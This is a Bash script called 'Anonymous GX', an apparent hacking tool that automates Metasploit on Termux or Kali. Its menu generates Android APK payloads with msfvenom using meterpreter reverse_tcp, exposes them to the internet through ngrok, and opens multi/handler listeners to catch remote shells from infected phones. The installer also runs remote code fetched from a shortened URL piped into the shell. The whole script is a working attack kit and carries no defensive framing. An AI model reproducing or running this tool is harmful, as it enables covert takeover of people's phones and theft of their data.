#!/bin/bash

# تعريف الألوان
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m' 
Purple='\033[0;35m'
LPurple='\033[1;35m'
Blue='\033[0;34m'
LBlue='\033[1;34m'
LGreen='\033[1;32m'
LRed='\033[1;31m'

#loading bar
loading_bar() {
    echo -e $LGreen ''
    figlet -c -f slant "Anonymous GX"
    sleep 2s
    echo ''
    echo -ne "$LGreen [+] Loading "
    for i in {1..30}; do
        echo -ne "▓"
        sleep 0.05
    done
    echo -e "${NC} Done!"
    sleep 1
}
# check for oprating system 
check_system() {
    if [[ -d "/data/data/com.termux" ]]; then
        echo -e "${GREEN}[+] You Are Using Termux.${NC}"
        SYSTEM="termux"
    elif [[ -f "/etc/debian_version" ]]; then
        echo -e "${GREEN}[+] Your Oprating System Is Kali Linux.${NC}"
        SYSTEM="kali"
    else
        echo -e "${RED}[-] Sorry Your System Is Not Support Your System !${NC}"
        exit 1
    fi
}
# Official Links Of Us 

YT=https://youtube.com/@linux_whith_mohamed
WA=https://wa.me/+994402309201
TE=https://t.me/Dev_GX
GITHUB=https://github.com/DeveloperGX

# check if metasploit is installed on device
check_msf() {
    if command -v msfconsole &> /dev/null; then
        echo -e "${GREEN}[+] Metasploit Allrady Installed (^_^). ${NC}"
    else
        sleep 1s
        clear
        sleep 1s
        echo -e "${RED}[-] Metasploit Is Not Installed Yet Please Waiting For Installing It (^_^) ...${NC}"
        install_msf
    fi
}

# installing metasploit
install_msf() {
    sleep 2s
    clear
    sleep 1s
    echo -e $LRed '';figlet -c -f slant "Installing Metasploit"
    if [[ "$SYSTEM" == "termux" ]]; then
        pkg update -y && pkg upgrade -y;
        pkg install unstable-repo -y;
        pkg install git wget tar zip unzip curl ;
        source <(curl -fsSL https://kutt.it/msf)
    elif [[ "$SYSTEM" == "kali" ]]; then
        sudo apt update -y;
        sudo apt install git wget tar zip unzip curl -y;
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
    fi
    echo -e "${GREEN}[+] Metasploit Is Installed On Your Device Successfully (^_^). ${NC}"
}
#banner of social media
show_contacts() {
    sleep 1s
    echo -e "${LBlue}╔══════════════════════════════════════════════════════════╗"
    sleep 0.08
    echo -e "${LGreen}║                 Created By Anonymous GX                  ${LGreen}║"
    sleep 0.08
    echo -e "${LBlue}╠══════════════════════════════════════════════════════════╣"
    sleep 0.08
    echo -e "${YELLOW}║ 🔗 YouTube : ${NC}${YT}    $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 💬 Telegram: ${NC}${TE}                         $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 📞 WhatsApp: ${NC}${WA}                 $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 💻 GitHub  : ${NC}${GITHUB}               $YELLOW║"
    sleep 0.08
    echo -e "${LBlue}╚══════════════════════════════════════════════════════════╝${NC}"
    sleep 0.08
    echo ''
    
    sleep 1s
}
# generate local payload
create_internal_payload() {
   sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating Payload"
    echo '' 
    sleep 0.3s
    read -p "Enter Your Local IP : " lhost1
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Enter Your Local Port : " lport1
    echo ''
    sleep 0.3s
    read -p "Please Enter Name Of APK PAyload : " payload_name
    echo ''
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -o $payload_name.apk
    sleep 1s
    echo ''
    sleep 1s
    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
    sleep 2s
}

# generate puplic payload
create_external_payload() {
    sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating Payload"
    echo '' 
    sleep 0.3s
    read -p "Enter Your Public Host : " lhost
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Enter Your Public Port : " lport
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Please Enter Name Of APK PAyload : " payload_name
    echo ''
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $payload_name.apk
    sleep 2s
    echo '' 
    sleep 1s
    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
    sleep 2s
}

# installing ngrok tool
install_ngrok() {
    if [[ "$SYSTEM" == "termux" ]]; then
        pkg install wget -y
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
        unzip ngrok-stable-linux-arm.zip
        chmod +x ngrok
        mv ngrok $PREFIX/bin/
    elif [[ "$SYSTEM" == "kali" ]]; then
        sudo apt install unzip -y
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip ngrok-stable-linux-amd64.zip
        chmod +x ngrok
        sudo mv ngrok /usr/local/bin/
    fi
    echo -e "${GREEN}[+] Ngrok Was Installed Successfully ${NC}"
}
#Anonymous GX Banner 
colors=("$LRed" "$LBlue" "$LGreen" "$LPurple" "$Red")
color=${colors[$RANDOM % ${#colors[@]}]}
colorr=${colors[$RANDOM % ${#colors[@]}]}
colorrr=${colors[$RANDOM % ${#colors[@]}]}
color1=${colors[$RANDOM % ${#colors[@]}]}
color2=${colors[$RANDOM % ${#colors[@]}]}
color3=${colors[$RANDOM % ${#colors[@]}]}
color4=${colors[$RANDOM % ${#colors[@]}]}

# Adding Ngrok Token to Tool
add_ngrok_token() {
    read -p "Please Enter Ngrok Token : " ngrok_token
    ngrok authtoken $ngrok_token
    echo -e "${GREEN}[+] Ngrok Token Saved Successfully ! ${NC}"
}

# Open Our Youtube Channel 
open_youtube_channel() {
    xdg-open "https://youtube.com/@linux_whith_mohamed" &>/dev/null || termux-open-url "https://youtube.com/@linux_whith_mohamed"
}

# Open Local Session listener
start_internal_listener() {
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost1; set LPORT $lport1; run"
    echo -e "${GREEN}[+] The Local Session Listener Was Started Successfully (^_^) ${NC}"
}

# Open Public Sission Listener 
start_external_listener() {
    read -p "Please Enter LHOST : " lhost
    read -p "Please Enter LPORT : " lport
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
    echo -e "${GREEN}[+] The Public Session Listener Was Started Successfully (^_^) .${NC}"
}

# Main Menu 
main_menu() {
    sleep 1s
    clear
    sleep 0.5s
    echo -e $LGreen '';figlet -c -f slant "Starting Tool"
    sleep 2s
    clear
    sleep 1s
    loading_bar
    echo ''
    check_system
    sleep 1s
    echo ''
    sleep 1s
    clear
    sleep 1s
    loading_bar
    echo ''
    check_msf
    sleep 1s
    while true; do
        clear
        clear
        sleep 0.08
        echo ''
        sleep 0.08
        echo -e "${color} █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗     ██████╗ ██╗  ██╗"
        sleep 0.08
        echo -e "${colorr}██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝    ██╔════╝ ╚██╗██╔╝"
        sleep 0.08
        echo -e "${colorrr}███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗    ██║  ███╗ ╚███╔╝ "
        sleep 0.08
        echo -e "${color1}██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║    ██║   ██║ ██╔██╗ "
        sleep 0.08
        echo -e "${color2}██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║    ╚██████╔╝██╔╝ ██╗"
        sleep 0.08
        echo -e "${color3}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝  ╚═╝"
        sleep 0.08
        echo -e "${color4}                            Script Version => 1"
        sleep 0.08
        echo ''
        show_contacts
        sleep 0.4
        echo -e "\n${YELLOW}[1]${NC} Generate Local Payload "
        sleep 0.2
        echo -e "${YELLOW}[2]${NC} Generate Public Payload "
        sleep 0.2
        echo -e "${YELLOW}[3]${NC} Installing Ngrok "
        sleep 0.2
        echo -e "${YELLOW}[4]${NC} Adding Ngrok Token "
        sleep 0.2
        echo -e "${YELLOW}[5]${NC} Start Listener Session "
        sleep 0.2
        echo -e "${YELLOW}[6]${NC} Our YouTube Channel "
        sleep 0.2
        echo -e "${YELLOW}[7]${NC} Exit Tool "
        sleep 0.2
        echo ''
        sleep 0.2
        read -p "Choose One Option From list : " choice
        sleep 0.2

        case $choice in
            1) create_internal_payload ;; 
            2) create_external_payload ;;
            3) 
                sleep 0.5s
                clear 
                echo -e $LGreen '';figlet -c -f slant "Install Ngrok"
                sleep 0.5s
                echo ''
                sleep 0.5s
                install_ngrok ;;
            4)
                sleep 0.5s
                clear 
                echo -e $LGreen '';figlet -c -f slant "Adding Token"
                sleep 0.5s
                echo ''
                sleep 0.5s
                add_ngrok_token ;;
            6) open_youtube_channel ;;
            5) 
                clear
                sleep 1s
                echo -e $LGreen '';figlet -c -f slant "Starting Listener"
                sleep 0.5s
                echo ''
                sleep 0.5s
                echo -e "${YELLOW}[1]${LPurple} Open Local Listener Sission "
                sleep 0.3s
                echo '' 
                sleep 0.3s
                echo -e "${YELLOW}[2]${LPurple} Open Puplic Listener Sission"$LGreen
                sleep 0.3s
                echo ''
                sleep 0.3
                read -p "Choose One Option : " listener_choice
                case $listener_choice in
                    1) start_internal_listener ;;
                    2) start_external_listener ;;
                    *) echo -e "${RED}[-] Error Choice ! ${NC}" ;;
                esac
                ;;
            7) 
                sleep 1s
                clear
                sleep 0.5s
                echo -e $LRed '';figlet -c -f slant "Closing Tool !"
                sleep 1s
                echo ''
                sleep 0.5s
                echo -e "${GREEN}[+] Closing Proggram ...${NC}"; exit 0 ;;
            *) 
                sleep 0.3s
                clear 
                echo -e $LRed '';figlet -c -f slant "Error !"
                sleep 0.5s
                echo ''

                echo -e "${RED}[-] Error Choice Please Try Again !${NC}";sleep 1s ;;
        esac
    done
}
main_menu

